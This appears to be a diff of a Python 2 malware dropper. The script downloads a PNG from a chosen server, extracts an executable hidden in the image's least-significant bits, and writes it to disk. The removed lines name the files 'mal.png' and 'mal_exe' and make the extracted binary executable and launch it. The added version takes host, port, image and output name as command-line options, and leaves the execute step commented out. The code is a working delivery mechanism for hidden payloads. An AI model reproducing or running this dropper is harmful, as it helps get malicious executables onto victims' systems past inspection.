@@ -7,19 +7,12 @@ import urllib2
 import httplib
 import subprocess
 import sys
-import base64
 import os
 import string
 import cv2.cv as cv
+import logging
+from optparse import OptionParser
 
-# Set your payload server address
-HOST = "localhost" # sys.argv[1]
-# Set your webserver port address
-PORT = "80" # sys.argv[2]
-# Set your stego'd file path
-IMG = "mal.png"
-# Set the name of your payload to drop
-PAYLOAD = "mal_exe"
 # TURN THIS ON IF YOU WANT PROXY SUPPORT
 PROXY_SUPPORT = "OFF"
 # THIS WILL BE THE PROXY URL
@@ -119,33 +112,81 @@ class LSBSteg():
             output += chr(int(self.readByte(),2))
         return output
 
-# here is where we set all of our proxy settings
-if PROXY_SUPPORT == "ON":
+def drop(host, port, image, payload):
+  # here is where we set all of our proxy settings
+  if PROXY_SUPPORT == "ON":
 	auth_handler = urllib2.HTTPBasicAuthHandler()
 	auth_handler.add_password(realm='RESTRICTED ACCESS',
-                          	  uri=PROXY_URL, # PROXY SPECIFIED ABOVE
+                        	  uri=PROXY_URL, # PROXY SPECIFIED ABOVE
                               user=USERNAME, # USERNAME SPECIFIED ABOVE
                               passwd=PASSWORD) # PASSWORD SPECIFIED ABOVE
 	opener = urllib2.build_opener(auth_handler)
 	urllib2.install_opener(opener) 
 
-#Grab our file file from the web server and save it to a file
-req = urllib2.Request('http://%s:%s/%s' % (HOST,PORT,IMG))
-message = urllib2.urlopen(req)
-localFile = open('temp.png', 'w')
-localFile.write(message.read())
-localFile.close()
+  #Grab our file file from the web server and save it to a file
+  req = urllib2.Request('http://%s:%s/%s' % (host,port,image))
+  message = urllib2.urlopen(req)
+  localFile = open('temp.png', 'w')
+  localFile.write(message.read())
+  localFile.close()
 
-#Destego binary
-inp = cv.LoadImage('temp.png')
-steg = LSBSteg(inp)
-bin = steg.unhideBin()
-f = open(PAYLOAD,"wb") #Write the binary back to a file
-f.write(bin)
-f.close()
-os.system('rm temp.png')
+  #Destego binary
+  inp = cv.LoadImage('temp.png')
+  steg = LSBSteg(inp)
+  bin = steg.unhideBin()
+  f = open(payload,"wb") #Write the binary back to a file
+  f.write(bin)
+  f.close()
+  os.system('rm temp.png')
 
-#set executable
-os.chmod( PAYLOAD, 0777 )
-#Launch the executable
-os.system( './'+PAYLOAD )
+
+def main():
+  # Setup the command line arguments.
+  optp = OptionParser()
+
+  # Output verbosity options
+  optp.add_option('-q', '--quiet', help='set logging to ERROR',
+                  action='store_const', dest='loglevel',
+                  const=logging.ERROR, default=logging.INFO)
+  optp.add_option('-d', '--debug', help='set logging to DEBUG',
+                  action='store_const', dest='loglevel',
+                  const=logging.DEBUG, default=logging.INFO)
+  optp.add_option('-v', '--verbose', help='set logging to COMM',
+                  action='store_const', dest='loglevel',
+                  const=5, default=logging.INFO)
+
+  # Image and payload options
+  optp.add_option("-s", "--host", dest="host",
+                  help="The server to connect to")
+  optp.add_option("-p", "--port", dest="port",
+                  help="The port listening on the server")
+  optp.add_option("-i", "--image", dest="image",
+                  help="Name of the image to download")
+  optp.add_option("-o", "--out", dest="payload",
+                  help="Name of the payload to output")
+
+  opts, args = optp.parse_args()
+
+  # Setup logging
+  logging.basicConfig(level=opts.loglevel,
+                      format='%(levelname)-8s %(message)s')
+
+  if opts.host is None:
+    opts.host = raw_input("Host: ")
+  if opts.port is None:
+    opts.port = raw_input("Port: ")
+  if opts.image is None:
+    opts.image = raw_input("Image path: ")
+  if opts.payload is None:
+    opts.payload = raw_input("Name of the output file: ")
+
+  drop(opts.host, opts.port, opts.image, opts.payload)
+
+  #set executable
+  #os.chmod(opts.payload, 0777 )
+  #Launch the executable
+  #os.system( './'+payload )
+
+
+if __name__ == '__main__':
+  main()
